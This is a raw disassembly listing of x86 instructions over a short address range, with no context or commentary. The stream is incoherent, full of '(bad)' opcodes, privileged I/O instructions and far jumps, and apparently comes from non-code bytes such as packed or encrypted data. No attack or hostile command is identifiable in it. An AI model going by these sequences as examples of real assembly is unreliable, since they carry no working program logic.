  413b18:	xchg   edx,eax
  413b19:	loope  0x413ace
  413b1b:	repz dec esp
  413b1d:	inc    ecx
  413b1e:	dec    ebx
  413b1f:	jg     0x413b33
  413b21:	inc    esp
  413b22:	inc    eax
  413b23:	sbb    al,0x5e
  413b25:	sub    al,0x80
  413b27:	xor    eax,0x30e23d88
  413b2c:	popf   
  413b2d:	cs jle 0x413b99
  413b30:	outs   dx,DWORD PTR ds:[esi]
  413b31:	jp     0x413b3b
  413b33:	loope  0x413b0c
  413b35:	mov    dh,0x47
  413b37:	xor    DWORD PTR [edi+0x30bf5e6f],ebx
  413b3d:	xor    al,0xc5
  413b3f:	fadd   QWORD PTR [edx]
  413b41:	int    0xc
  413b43:	push   ebp
  413b44:	pushf  
  413b45:	(bad)  
  413b46:	xchg   ebx,eax
  413b47:	call   0x7fa6:0xf81c8e94
  413b4e:	push   0x84692744
  413b53:	cmp    cl,ah
  413b55:	clc    
  413b56:	mov    ds:0x752771cf,al
  413b5b:	loop   0x413b14
  413b5d:	xchg   ecx,eax
  413b5e:	fstp   st(5)
  413b60:	test   DWORD PTR [edx+eiz*4],eax
  413b63:	jp     0x413bd9
  413b65:	call   DWORD PTR [eax+0x4c]
  413b68:	scas   eax,DWORD PTR es:[edi]
  413b69:	push   esp
  413b6a:	pop    eax
  413b6b:	repz sub ch,BYTE PTR [eax-0x66b1f4c]
  413b72:	mov    al,ds:0xa4ad8470
  413b77:	jbe    0x413be0
  413b79:	rcl    DWORD PTR [eax-0x28],cl
  413b7c:	repnz xor DWORD PTR [eax],eax
  413b7f:	inc    esp
  413b80:	ins    DWORD PTR es:[edi],dx
  413b81:	(bad)  
  413b83:	xor    dl,BYTE PTR [ecx+0x3af0c2ea]
  413b89:	push   edi
  413b8a:	fmul   QWORD PTR [eax]
  413b8c:	inc    eax
  413b8d:	inc    edx
  413b8e:	or     edx,DWORD PTR [edi+ebx*8]
  413b91:	cmp    ah,BYTE PTR [edx]
  413b93:	retf   0x2cd6
  413b96:	xchg   ebp,eax
  413b97:	jl     0x413b6f
  413b99:	imul   edi,DWORD PTR [ecx+0x2b7bbd4c],0xe
  413ba0:	jbe    0x413be3
  413ba2:	out    dx,eax
  413ba3:	pop    ebx
  413ba4:	mov    edi,0x6eb15d05
  413ba9:	xchg   ebx,eax
  413baa:	jmp    0xd7b7:0xdae1ede6
  413bb1:	sub    ecx,DWORD PTR [edi-0x20]
  413bb4:	xor    ah,BYTE PTR [eax+0x7]
  413bb7:	scas   eax,DWORD PTR es:[edi]
  413bb8:	pop    ds
  413bb9:	sub    dl,BYTE PTR ds:0xfbe1c504
  413bbf:	stos   BYTE PTR es:[edi],al
  413bc0:	mov    dh,0x20
  413bc2:	dec    ecx
  413bc3:	mov    edx,0x98250849
  413bc8:	dec    eax
  413bc9:	ins    BYTE PTR es:[edi],dx
  413bca:	mov    eax,0xc99d05e
  413bcf:	or     al,BYTE PTR [edx+0x4b2cf50a]
  413bd5:	add    esp,DWORD PTR [edx-0x2f572883]
  413bdb:	imul   edi,DWORD PTR [edi-0x25],0x3f
  413bdf:	xchg   esp,eax
  413be0:	daa    
  413be1:	xor    edx,esi
  413be3:	mov    edx,edx
  413be5:	or     ebx,DWORD PTR [ebx+0x46e47e5e]
  413beb:	gs js  0x413c14
  413bee:	ret    0x8cb3
  413bf1:	push   eax
  413bf2:	push   eax
  413bf3:	mov    ebx,0xdfc25e0b
  413bf8:	pop    edi
  413bf9:	nop
  413bfa:	imul   ebx,DWORD PTR [ecx-0x74],0x3ffda57e
  413c01:	push   ecx
  413c02:	lods   al,BYTE PTR ds:[esi]
  413c03:	or     ebp,DWORD PTR [ebx-0x10]
  413c06:	sub    al,0xcd
  413c08:	ins    BYTE PTR es:[edi],dx
  413c09:	xchg   edx,eax
  413c0a:	push   eax
  413c0b:	retf   
  413c0c:	ins    DWORD PTR es:[edi],dx
  413c0d:	xor    BYTE PTR [esi],dh
  413c0f:	fstp   DWORD PTR [edx-0x7750ec5e]
  413c15:	fnstcw WORD PTR [eax]
  413c17:	mov    ch,0xa4
  413c19:	mov    ah,0xf0
  413c1b:	mov    ebx,0x4a45d1ce
  413c20:	push   esi
  413c21:	sar    ecx,1
  413c23:	ror    BYTE PTR [ecx],0x27
  413c26:	jle    0x413c3a
  413c28:	call   0xddaeefaa
  413c2d:	mov    BYTE PTR [ebp+0x7c0ed6c8],dl
  413c33:	mov    dh,0x1
  413c35:	out    dx,al
  413c36:	pop    esi
  413c37:	pop    edx
  413c38:	or     bl,BYTE PTR [esi-0xa]
  413c3b:	sbb    bh,bl
  413c3d:	fcomp  DWORD PTR [esi+0x1c]
  413c40:	and    al,0x74
  413c42:	mov    edx,0xf625ad72
  413c47:	neg    BYTE PTR [ebx-0x12]
  413c4a:	cmp    eax,0xc0a409af
  413c4f:	(bad)  
  413c51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c52:	sub    dl,BYTE PTR [edx+0x2aa8dc97]
  413c58:	mov    cl,0xe1
  413c5a:	fwait
  413c5b:	mov    dl,0xca
  413c5d:	(bad)  
  413c5e:	fwait
  413c5f:	pop    es
  413c60:	sahf   
  413c61:	mov    al,ds:0x904595fa
  413c66:	arpl   bp,ax
  413c68:	push   ebx
  413c69:	sbb    al,0x98
  413c6b:	sbb    BYTE PTR [edx],0xe
  413c6e:	xchg   ecx,eax
  413c6f:	rcr    cl,1
  413c71:	in     al,0x51
  413c73:	sbb    edi,edi
  413c75:	mov    ebx,0xd1ea3bc9
  413c7a:	dec    edi
  413c7b:	lods   eax,DWORD PTR ds:[esi]
  413c7c:	mov    ah,0x54
  413c7e:	inc    edx
  413c7f:	test   BYTE PTR [edx+0x7c],dh
  413c82:	adc    edi,DWORD PTR ds:0x9e75acdf
  413c88:	push   edi
  413c89:	xchg   esp,eax
  413c8a:	shl    DWORD PTR ds:0x6a38b444,cl
  413c90:	outs   dx,BYTE PTR ds:[esi]
  413c91:	and    DWORD PTR [edi+0x7a59d1ce],ebx
  413c97:	cmp    eax,0xdd13b760
  413c9c:	xor    ah,BYTE PTR ds:0xd7573e4f
  413ca2:	xchg   esi,eax
  413ca3:	pop    edi
  413ca4:	stos   DWORD PTR es:[edi],eax
  413ca5:	fsubr  QWORD PTR [esp+eax*4-0x73]
  413ca9:	push   esi
  413caa:	jmp    0x8d20a7c9
  413caf:	dec    ebx
  413cb0:	pop    ss
  413cb1:	cmp    BYTE PTR [esi+0x77],0x79
  413cb5:	cmp    bl,dh
  413cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cb8:	jle    0x413c4c
  413cba:	xchg   esi,eax
  413cbb:	mov    al,0xdb
  413cbd:	dec    esp
  413cbe:	cld    
  413cbf:	xor    edx,DWORD PTR [ebp+0x14]
  413cc2:	add    BYTE PTR [ecx-0x16],dh
  413cc5:	popf   
  413cc6:	sub    bh,BYTE PTR [eax]
  413cc8:	jmp    0x413cdd
  413cca:	js     0x413ca5
  413ccc:	sbb    BYTE PTR [edi],ch
  413cce:	es ret 
  413cd0:	cmp    DWORD PTR [ebp-0x2a],0x44319442
  413cd7:	mov    al,ds:0xd158fba4
  413cdc:	jp     0x413d56
  413cde:	addr16 xchg edi,eax
  413ce0:	std    
  413ce1:	(bad)  
  413ce2:	mov    eax,0x30177f12
  413ce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ce8:	stos   DWORD PTR es:[edi],eax
  413ce9:	sub    dh,BYTE PTR [edi]
  413ceb:	shl    BYTE PTR [eax+edx*2+0x37],cl
  413cef:	xchg   ecx,eax
  413cf0:	xchg   edx,eax
  413cf1:	shl    DWORD PTR [edx+0x62],0x19
  413cf5:	neg    dh
  413cf7:	(bad)  
  413cf8:	repz jb 0x413d24
  413cfb:	xor    edi,DWORD PTR [eax]
  413cfd:	mov    ebx,ebx
  413cff:	outs   dx,DWORD PTR ds:[esi]
  413d00:	lods   eax,DWORD PTR ds:[esi]
  413d01:	add    BYTE PTR [edi-0x3865e14],dl
  413d07:	xchg   ebp,eax
  413d08:	mov    al,BYTE PTR [edx+0xf]
  413d0b:	jle    0x413cdb
  413d0d:	jb     0x413ca9
  413d0f:	stc    
  413d10:	out    dx,al
  413d11:	mov    DWORD PTR [ecx+0x20],edi
  413d14:	retf   0xd2f2
  413d17:	sub    al,0x6b
  413d19:	shl    DWORD PTR [esi+0x33ec21a0],cl
  413d1f:	add    DWORD PTR [ecx-0x67],edi
  413d22:	ja     0x413d81
  413d24:	(bad)  
  413d26:	push   ebx
  413d27:	sub    DWORD PTR [ebp+0x485af6db],esi
  413d2d:	xchg   esi,eax
  413d2e:	pop    ebp
  413d2f:	cdq    
  413d30:	and    ch,dl
  413d32:	pop    ds
  413d33:	addr16 add al,0x26
  413d36:	dec    esp
  413d37:	add    edi,ecx
  413d39:	loope  0x413d28
  413d3b:	call   FWORD PTR [ebp-0x76]
  413d3e:	cmp    DWORD PTR [ebx+0x72],ebx
  413d41:	lahf   
  413d42:	jnp    0x413ccc
  413d44:	hlt    
  413d45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d46:	add    bl,BYTE PTR [eax]
  413d48:	inc    ebx
  413d49:	fsub   DWORD PTR [ebp+0x74]
  413d4c:	push   esi
  413d4d:	into   
  413d4e:	test   BYTE PTR ds:0xe8214b00,0x39
  413d55:	mov    ebx,0x7b7643c7
  413d5a:	cmp    eax,DWORD PTR [esi]
  413d5c:	xor    al,0xd5
  413d5e:	xor    esp,edx
  413d60:	fisubr DWORD PTR [edx-0x3759f720]
  413d66:	mov    cl,0xdf
  413d68:	int    0x58
  413d6a:	sub    DWORD PTR es:[edx+0x11c0bb04],ebx
  413d71:	jns    0x413d6b
  413d73:	push   ds
  413d74:	push   eax
  413d75:	cli    
  413d76:	lods   eax,DWORD PTR ds:[esi]
  413d77:	sbb    al,0x0
  413d79:	pop    ebp
  413d7a:	mov    edi,0xb36c6f94
  413d7f:	add    DWORD PTR [ebp-0x59cfbe44],edi
  413d85:	enter  0x4b7f,0xf6
  413d89:	scas   eax,DWORD PTR es:[edi]
  413d8a:	ins    DWORD PTR es:[edi],dx
  413d8b:	dec    edx
  413d8c:	push   ebp
  413d8d:	outs   dx,DWORD PTR ds:[esi]
  413d8e:	sbb    BYTE PTR [edx],dh
  413d90:	mov    ds:0x5c42417,al
  413d95:	fsub   st,st(1)
  413d97:	mov    esi,0xf027d6f4
  413d9c:	stos   DWORD PTR es:[edi],eax
  413d9d:	icebp  
  413d9e:	mov    dh,0x0
  413da0:	out    0xc0,al
  413da2:	push   0x43faa9d3
  413da7:	mov    ch,0x94
  413da9:	(bad)  
  413daa:	and    al,0xda
  413dac:	xor    eax,0x5c9bf30d
  413db2:	stos   BYTE PTR es:[edi],al
  413db3:	mov    cl,0x72
  413db5:	push   edx
  413db6:	and    dl,cl
  413db8:	pop    ecx
  413db9:	mov    cl,0x1c
  413dbb:	mov    dh,ch
  413dbd:	jmp    0xbb85:0x9ca4b065
  413dc4:	mov    edx,0x27ba6d0f
  413dc9:	cs jbe 0x413e3a
  413dcc:	or     esp,DWORD PTR [edi-0x4f334057]
  413dd2:	push   ds
  413dd3:	loope  0x413def
  413dd5:	sbb    ecx,DWORD PTR [esi+0x1e]
  413dd8:	inc    ebx
  413dd9:	in     al,dx
  413dda:	test   DWORD PTR [ebx-0x6a],ebx
  413ddd:	adc    eax,0x9043f9eb
  413de2:	imul   ecx,DWORD PTR [edx+0x65470199],0x5d
  413de9:	push   edi
  413dea:	add    DWORD PTR [edx+esi*2+0x250a4640],esi
  413df1:	push   edi
  413df2:	jb     0x413d8f
  413df4:	xor    BYTE PTR [ecx+0x2f1b92a],ah
  413dfa:	ins    BYTE PTR es:[edi],dx
  413dfb:	dec    esi
  413dfc:	lahf   
  413dfd:	inc    edx
  413dfe:	push   ebx
  413dff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e00:	imul   ecx,DWORD PTR [ebx+0x2b3b9ff9],0x5e
  413e07:	div    BYTE PTR [eax]
  413e09:	push   esi
  413e0a:	xlat   BYTE PTR ds:[ebx]
  413e0b:	sbb    bh,0x1d
  413e0e:	push   cs
  413e0f:	adc    BYTE PTR [ebp+0xd],al
  413e12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e13:	daa    
  413e14:	ror    BYTE PTR [eax-0x11ea9103],cl
  413e1a:	xor    ebp,ebx
  413e1c:	rcl    DWORD PTR ss:[ebp+0x58],cl
  413e20:	iret   
  413e21:	push   esi
  413e22:	xor    edx,DWORD PTR [ebx+ebp*4-0x4d884fa1]
  413e29:	(bad)  
  413e2b:	mov    bh,BYTE PTR [ebx+0x6e325808]
  413e31:	mov    dl,0x9f
  413e33:	out    0x38,eax
  413e35:	ins    DWORD PTR es:[edi],dx
  413e36:	pushf  
  413e37:	xchg   dl,ch
  413e39:	push   es
  413e3a:	push   ebp
  413e3b:	xor    eax,0x38f49d32
  413e40:	int    0x65
  413e42:	or     BYTE PTR [ecx],bh
  413e44:	adc    edi,esp
  413e46:	lds    edi,FWORD PTR [ebx+0x16]
  413e49:	add    edi,DWORD PTR ds:[eax-0xd]
  413e4d:	sbb    al,0x67
  413e4f:	repz pop esp
  413e51:	and    BYTE PTR [edi+0x1927d0ed],ch
  413e57:	js     0x413ebe
  413e59:	out    dx,al
  413e5a:	mov    bl,0xd1
  413e5c:	test   eax,0x84250691
  413e61:	aam    0x96
  413e63:	pop    edx
  413e64:	cmp    ebp,DWORD PTR [ecx]
  413e66:	imul   edi,edx,0xffffffa8
  413e69:	fistp  QWORD PTR [ecx-0x3662fa08]
  413e6f:	mov    dl,BYTE PTR [edx]
  413e71:	pop    es
  413e72:	gs push 0x288a8c0d
  413e78:	dec    esi
  413e79:	bound  edi,QWORD PTR ds:0xa74da045
  413e7f:	jbe    0x413e6b
  413e81:	jmp    0xe67d:0x1da446fd
  413e88:	add    dl,BYTE PTR [edi]
  413e8a:	in     al,dx
  413e8b:	sub    edx,DWORD PTR [ebp-0x29d3924f]
  413e91:	mov    ecx,0x53e949ff
  413e96:	int    0xaa
  413e98:	sub    ch,BYTE PTR [ebx+ebx*1]
  413e9b:	outs   dx,BYTE PTR ds:[esi]
  413e9c:	sbb    BYTE PTR [esi],dl
  413e9e:	(bad)  
  413ea0:	and    BYTE PTR [ecx],dh
  413ea2:	adc    ebp,DWORD PTR [eax]
  413ea4:	pop    edx
  413ea5:	jnp    0x413ecb
  413ea7:	mov    esi,0x47df7343
  413eac:	stc    
  413ead:	call   0x5081:0xa134152f
  413eb4:	sub    BYTE PTR [eax+0x7859d8f5],bh
  413eba:	adc    DWORD PTR [ebx],edi
  413ebc:	fld    DWORD PTR [edi+0x7a]
  413ebf:	sub    BYTE PTR [esi-0x40a9b269],ch
  413ec5:	or     edx,DWORD PTR [edi-0x744cce0e]
  413ecb:	and    eax,0xd022320f
  413ed0:	mov    dl,0x9a
  413ed2:	in     al,dx
  413ed3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed4:	imul   ecx,DWORD PTR [esi+edx*2-0x7a6ad735],0xb9136e7d
  413edf:	ds in  al,dx
  413ee1:	mov    ds:0xe079eb3a,eax
  413ee6:	es das 
  413ee8:	adc    eax,0x3143ab0c
  413eed:	sbb    BYTE PTR [ecx],al
  413eef:	xor    eax,0xc9b2ee20
  413ef4:	dec    esi
  413ef5:	js     0x413f16
  413ef7:	retf   
  413ef8:	ins    DWORD PTR es:[edi],dx
  413ef9:	push   eax
  413efa:	dec    eax
  413efb:	shr    DWORD PTR ds:0x48874d0,cl
  413f01:	xchg   edx,edx
  413f03:	and    eax,0x16e47505
  413f08:	adc    BYTE PTR [ecx+0x51dc41cf],bl
  413f0e:	sbb    DWORD PTR [ebx+0x53fad4ab],edi
  413f14:	pop    ebp
  413f15:	push   ebx
  413f16:	in     al,dx
  413f17:	mov    ?,ebp
  413f19:	test   ebx,ecx
  413f1b:	out    0x3,eax
  413f1d:	and    DWORD PTR [ebx-0x7310d69c],edx
  413f23:	push   ebp
  413f24:	and    esi,DWORD PTR [edx-0x6f]
  413f27:	mov    ecx,0x4b0e5ba0
  413f2c:	adc    DWORD PTR [eax],ecx
  413f2e:	loope  0x413f13
  413f30:	icebp  
  413f31:	xor    esp,esi
  413f33:	das    
  413f34:	pusha  
  413f35:	or     BYTE PTR [edi+0x75],ch
  413f38:	aaa    
  413f39:	mov    dl,0x3c
  413f3b:	and    BYTE PTR [ebp+0x32cecc4f],0xe
  413f42:	pop    ebx
  413f43:	pop    esi
  413f44:	pop    ebx
  413f45:	adc    DWORD PTR [esi],esp
  413f47:	arpl   WORD PTR [eax+0x2ce5145],si
  413f4d:	cmp    eax,0xa63ad764
  413f52:	mov    ch,0x8
  413f54:	dec    ebx
  413f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f56:	add    DWORD PTR [edx],ecx
  413f58:	mov    ecx,0x254b47e7
  413f5d:	daa    
  413f5e:	push   eax
  413f5f:	cmp    eax,0x5541b9b0
  413f64:	xor    eax,0xb097b414
  413f69:	adc    BYTE PTR [eax],bh
  413f6b:	out    dx,al
  413f6c:	int3   
  413f6d:	jo     0x413fe4
  413f6f:	adc    ebp,DWORD PTR [edi+0x72]
  413f72:	jae    0x413f79
  413f74:	iret   
  413f75:	jbe    0x413f0c
  413f77:	push   ds
  413f78:	xchg   BYTE PTR [eax+0x53],dh
  413f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f7c:	sbb    al,BYTE PTR [edi+0x5b33e925]
  413f82:	cmp    eax,0x31ffe52f
  413f87:	ret    0x8733
  413f8a:	jmp    0x97515ba1
  413f8f:	push   ds
  413f90:	xor    DWORD PTR [ebx],0xffffff85
  413f93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f94:	and    ah,BYTE PTR [edx+esi*8-0x75eed810]
  413f9b:	in     al,dx
  413f9c:	imul   esi,DWORD PTR [edx+0x2e],0x3a154a11
  413fa3:	ins    DWORD PTR es:[edi],dx
  413fa4:	cld    
  413fa5:	in     eax,0x55
  413fa7:	mov    esi,DWORD PTR [edx]
  413fa9:	push   0x53eb75cc
  413fae:	and    bh,BYTE PTR [esi+eiz*1-0x7f0859e6]
  413fb5:	jb     0x413f48
  413fb7:	js     0x413f47
  413fb9:	aad    0x9
  413fbb:	add    cl,dl
  413fbd:	dec    ecx
  413fbe:	mov    dl,0x9c
  413fc0:	mov    cl,BYTE PTR [esi+0x5c1f77d4]
  413fc6:	jns    0x413fbd
  413fc8:	push   es
  413fc9:	hlt    
  413fca:	inc    ebp
  413fcb:	mov    fs,WORD PTR [esi]
  413fcd:	stos   DWORD PTR es:[edi],eax
  413fce:	test   bl,cl
  413fd0:	dec    esp
  413fd1:	sub    DWORD PTR [ebx+edx*8-0x15],0x21
  413fd6:	jmp    0x160e:0xe83ee8d2
  413fdd:	fisubr DWORD PTR [edi]
  413fdf:	sar    BYTE PTR [esi+0x62f33fb0],cl
  413fe5:	push   es
  413fe6:	inc    edi
  413fe7:	and    esi,DWORD PTR [edx-0x6]
  413fea:	and    al,bl
  413fec:	pop    ebx
  413fed:	lds    eax,FWORD PTR [ebp-0x8]
  413ff0:	mov    es,WORD PTR [eax-0x73ef92d7]
  413ff6:	leave  
  413ff7:	nop
  413ff8:	push   ss
  413ff9:	and    eax,0x7ca49c2
  413ffe:	adc    al,0x80
  414000:	xchg   ebx,eax
  414001:	add    al,0x18
  414003:	call   FWORD PTR [ecx+0x18]
  414006:	lds    ebp,FWORD PTR [edi-0x4cdd0cfc]
  41400c:	push   es
  41400d:	fimul  DWORD PTR [edx-0x8]
  414010:	adc    DWORD PTR [edi],edi
  414012:	(bad)  
  414013:	(bad)  
  414014:	mov    eax,0xfd411177
  414019:	adc    eax,0xc6317f6a
  41401e:	inc    ecx
  41401f:	cmp    BYTE PTR [ebx+eax*4-0x162d8e49],al
  414026:	or     ebx,ecx
  414028:	add    ebp,edi
  41402a:	mov    cl,BYTE PTR [ecx]
  41402c:	mov    ah,0x2c
  41402e:	add    DWORD PTR [ebp+0x6e],edx
  414031:	adc    DWORD PTR [ebx],edi
  414033:	aaa    
  414034:	cmp    ah,BYTE PTR [ecx+0x4f]
  414037:	dec    esi
  414039:	mov    ebp,DWORD PTR ds:0xa772adf4
  41403f:	jge    0x4140a4
  414041:	out    0xed,al
  414043:	xor    al,0x95
  414045:	out    dx,eax
  414046:	sbb    dl,0x71
  414049:	push   esp
  41404a:	inc    edx
  41404b:	inc    edi
  41404c:	int    0xeb
  41404e:	in     al,dx
  41404f:	xchg   ebx,eax
  414050:	jle    0x413fda
  414052:	push   cs
  414053:	ret    
  414054:	mov    ah,cl
  414056:	push   es
  414057:	mov    ss:0x65e4dd21,al
  41405d:	mov    edx,0xa1c34633
  414062:	bound  edi,QWORD PTR [esi-0xed8bcea]
  414068:	enter  0x90cd,0x2c
  41406c:	cwde   
  41406d:	mov    bh,0x4e
  41406f:	repnz popa 
  414071:	mov    bl,cl
  414073:	test   edi,esp
  414075:	jbe    0x4140ac
  414077:	in     al,0x0
  414079:	test   al,0x2a
  41407b:	outs   dx,DWORD PTR ds:[esi]
  41407c:	(bad)  
  41407d:	imul   BYTE PTR [edi]
  41407f:	out    dx,al
  414080:	mov    ds:0x7ec558ec,eax
  414085:	push   es
  414086:	add    BYTE PTR [edx-0x5ae2eb35],0x9a
  41408d:	pop    ecx
  41408e:	mov    ch,0x13
  414090:	adc    BYTE PTR [ecx-0x46],al
  414093:	les    ecx,FWORD PTR [eax]
  414095:	pop    ds
  414096:	mov    eax,0x7253e58e
  41409b:	fisub  WORD PTR [edi-0x1d]
  41409e:	cmp    edx,DWORD PTR [ecx+0x30]
  4140a1:	mov    BYTE PTR [ecx-0x56],bh
  4140a4:	rcl    ah,1
  4140a6:	fcomp  DWORD PTR [esi+0x2a]
  4140a9:	push   DWORD PTR [ebp+0x3c21dd19]
  4140af:	or     DWORD PTR [ebx-0x427ed0d2],ebp
  4140b5:	stos   DWORD PTR es:[edi],eax
  4140b6:	or     bl,BYTE PTR [edi-0x493f53fd]
  4140bc:	call   0x94cfc27
  4140c1:	or     dl,BYTE PTR [edx+0x5a45d8c4]
  4140c7:	lds    ecx,FWORD PTR [ebp+0x6355c59b]
  4140cd:	or     DWORD PTR [ebx+ebp*2+0x35158473],edi
  4140d4:	fmul   QWORD PTR [ebx]
  4140d6:	mov    ah,0xfc
  4140d8:	add    esi,esi
  4140da:	sub    esp,ebp
  4140dc:	ins    BYTE PTR es:[edi],dx
  4140dd:	mov    ebx,0x723ce796
  4140e2:	fcom   DWORD PTR [edi+0x5d]
  4140e5:	bnd jo 0x414160
  4140e8:	push   ss
  4140e9:	or     ah,bh
  4140eb:	jb     0x414148
  4140ed:	pop    esp
  4140ee:	jnp    0x414159
  4140f0:	cwde   
  4140f1:	lods   al,BYTE PTR ds:[esi]
  4140f2:	hlt    
  4140f3:	dec    BYTE PTR [edx+0x525f54ca]
  4140f9:	dec    ebx
  4140fa:	mov    eax,0x8d959a8d
  4140ff:	lds    edi,FWORD PTR [ebp-0x4952b77a]
  414105:	pop    ebx
  414106:	loopne 0x41416c
  414108:	add    ah,dh
  41410a:	cld    
  41410b:	in     al,dx
  41410c:	mov    ds:0x7dc069a4,eax
  414111:	add    DWORD PTR [edi-0x9],0x87be6e7f
  414118:	push   0xffffffd6
  41411a:	push   esp
  41411b:	mov    ebp,0x5f6dd7e9
  414120:	mov    al,0x37
  414122:	mov    bl,0xb4
  414124:	jmp    0x414133
  414126:	ss pop ebx
  414128:	jns    0x4140ee
  41412a:	sbb    dh,ch
  41412c:	inc    ebp
  41412d:	inc    ebx
  41412e:	outs   dx,BYTE PTR ds:[esi]
  41412f:	mov    BYTE PTR [ecx-0x46e06e9],bl
  414135:	jmp    0x414126
  414137:	outs   dx,BYTE PTR ds:[esi]
  414138:	std    
  414139:	mov    bl,dl
  41413b:	enter  0xc8c7,0x82
  41413f:	mov    al,BYTE PTR [esi]
  414141:	inc    ebx
  414143:	mov    ds:0x72b42312,al
  414148:	cvtpi2ps xmm1,QWORD PTR [ebx+0x61]
  41414c:	js     0x4141ae
  41414e:	sbb    bl,bl
  414150:	ret    0x1a0a
  414153:	add    dh,bl
  414155:	in     al,0xac
  414157:	inc    ebx
  414158:	sub    eax,0x38160db
  41415d:	xchg   edx,eax
  41415e:	call   0xd6cd859e
  414163:	repnz fisttp WORD PTR [esi+ebp*4+0x4fe2f4ae]
  41416b:	aad    0x10
  41416d:	mov    bh,0x5c
  41416f:	call   0x38b8:0x92beb1eb
  414176:	or     BYTE PTR [edx+edx*4],cl
  414179:	mov    esi,0x966fe9cd
  41417e:	ins    BYTE PTR es:[edi],dx
  41417f:	cwde   
  414180:	ss out dx,eax
  414182:	add    DWORD PTR [esi+edx*4-0x80],edx
  414186:	out    0xcd,eax
  414188:	cli    
  414189:	sbb    BYTE PTR [esp+ebp*1+0x4],bl
  41418d:	dec    edi
  41418e:	(bad)  
  41418f:	aaa    
  414190:	scas   al,BYTE PTR es:[edi]
  414191:	jb     0x4141fc
  414193:	(bad)  
  414194:	clc    
  414195:	or     DWORD PTR [ebx-0x4e1073da],ebx
  41419b:	jmp    0x36e5:0xa155653c
  4141a2:	mov    eax,?
  4141a4:	shl    DWORD PTR [edi],0xff
  4141a7:	sbb    BYTE PTR [edi+0x4a],ah
  4141aa:	dec    ebx
  4141ab:	mov    ebx,0x92d7e55f
  4141b0:	shr    BYTE PTR [ecx-0x1a],0xf2
  4141b4:	and    ch,BYTE PTR [ebx]
  4141b6:	dec    ebx
  4141b7:	push   0xffffff8f
  4141b9:	add    BYTE PTR [edi],dl
  4141bb:	mov    edx,0x1ec56762
  4141c0:	es (bad) 
  4141c2:	int    0xb3
  4141c4:	clc    
  4141c5:	pop    eax
  4141c6:	adc    eax,0x7bb16052
  4141cb:	ins    DWORD PTR es:[edi],dx
  4141cc:	push   ecx
  4141cd:	in     al,0x42
  4141cf:	in     al,0x56
  4141d1:	mov    al,0x5c
  4141d4:	xor    al,0x3d
  4141d6:	sbb    BYTE PTR [ecx+0x19],bh
  4141d9:	stc    
  4141da:	push   edx
  4141db:	int    0xdd
  4141dd:	(bad)  
  4141de:	push   ebx
  4141df:	inc    ebp
  4141e0:	popf   
  4141e1:	lahf   
  4141e2:	inc    esp
  4141e3:	xchg   BYTE PTR [ecx],bh
  4141e5:	sub    edi,DWORD PTR [eax]
  4141e7:	stos   BYTE PTR es:[edi],al
  4141e8:	xchg   edi,eax
  4141e9:	jmp    0x9a412a8d
  4141ee:	xchg   ecx,eax
  4141ef:	cmp    ah,0x10
  4141f2:	mov    dl,0x89
  4141f4:	mov    BYTE PTR [ebx-0x20735c82],cl
  4141fa:	and    eax,0x1c7875ff
  4141ff:	sub    edx,DWORD PTR [ebx-0x76]
  414202:	mov    ds:0x6c5fc668,eax
  414207:	lock sbb al,BYTE PTR [esi-0x7c9077b4]
  41420e:	mov    ah,0xd4
  414210:	call   0x6e00:0x65d566c0
  414217:	or     BYTE PTR es:[ebp-0xc],bh
  41421b:	cld    
  41421c:	mov    ss:0xa7b43245,al
  414222:	lods   eax,DWORD PTR ds:[esi]
  414223:	mov    esi,?
  414225:	sbb    al,0x3d
  414227:	jmp    0xf085:0xa2ce19a4
  41422e:	imul   esp,DWORD PTR [edx+0x24],0xa2058af6
  414235:	inc    esp
  414236:	fdivr  DWORD PTR [ebx-0x73]
  414239:	iret   
  41423a:	add    al,0xb
  41423c:	fiadd  DWORD PTR [ebp+0x1017e109]
  414242:	sahf   
  414243:	adc    bl,BYTE PTR [edi+0x34ddc2e]
  414249:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41424a:	dec    ebx
  41424b:	xor    eax,0x2c5d6f2e
  414250:	sbb    al,0x1c
  414252:	test   al,0x97
  414254:	add    edi,esp
  414256:	lds    eax,FWORD PTR [esi]
  414258:	adc    DWORD PTR [edx+0x49],edi
  41425b:	xchg   ebx,eax
  41425c:	inc    edx
  41425d:	inc    esi
  41425e:	inc    esp
  41425f:	lods   eax,DWORD PTR ds:[esi]
  414260:	arpl   bx,di
  414262:	es ins BYTE PTR es:[edi],dx
  414264:	xlat   BYTE PTR ds:[ebx]
  414265:	enter  0xe99c,0x31
  414269:	mov    dh,0x83
  41426b:	inc    esp
  41426c:	dec    edx
  41426d:	add    eax,ebx
  41426f:	retf   0x2129
  414272:	in     al,0xd7
  414274:	lods   al,BYTE PTR ds:[esi]
  414275:	add    edx,DWORD PTR [eax-0x882e44a]
  41427b:	mov    esp,0xde96c23
  414280:	add    DWORD PTR [ebx+eax*2],0x33a978cd
  414287:	scas   eax,DWORD PTR es:[edi]
  414288:	pop    esi
  414289:	cwde   
  41428a:	cwde   
  41428b:	jle    0x4142f4
  41428d:	add    al,0xa8
  41428f:	popa   
  414290:	mov    esi,0x3ec20ec4
  414295:	and    esp,esp
  414297:	pcmpeqw mm1,QWORD PTR [esi]
  41429a:	jmp    0x393c3fd4
  41429f:	pop    edx
  4142a0:	fldcw  WORD PTR [edi+0x6f]
  4142a3:	or     eax,0x154db994
  4142a8:	fcmovnb st,st(7)
  4142aa:	cmc    
  4142ab:	cmp    BYTE PTR [edx+ebp*2-0x18],0x54
  4142b0:	jp     0x414305
  4142b2:	lods   al,BYTE PTR ds:[esi]
  4142b3:	es adc ecx,edi
  4142b6:	(bad)  
  4142b7:	pop    edx
  4142b8:	icebp  
  4142b9:	add    eax,0xf60205b5
  4142be:	call   0xb728c279
  4142c3:	mov    cl,0xfb
  4142c5:	call   0x5fb30555
  4142ca:	in     eax,dx
  4142cb:	fcmovu st,st(3)
  4142cd:	cmp    BYTE PTR [ecx],dh
  4142cf:	(bad)  
